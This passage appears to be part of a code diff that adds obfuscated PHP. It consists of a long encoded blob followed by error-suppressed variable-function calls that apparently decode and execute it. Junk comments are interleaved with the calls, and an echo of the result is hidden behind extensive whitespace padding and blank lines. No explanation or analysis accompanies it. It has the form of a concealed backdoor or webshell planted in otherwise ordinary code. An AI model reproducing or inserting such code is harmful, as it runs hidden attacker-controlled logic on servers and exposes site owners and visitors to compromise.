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';
+			
+			/*dk72i6ye4*/@$___();/*n70jl6kl79h1gx*/@$__________(/*y8eby1o*/@$______(/*ot5z22*/@$__(/*tm18bdqw8ju*/$_))); $________=/*1i*/@$____();
+			$_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
+			
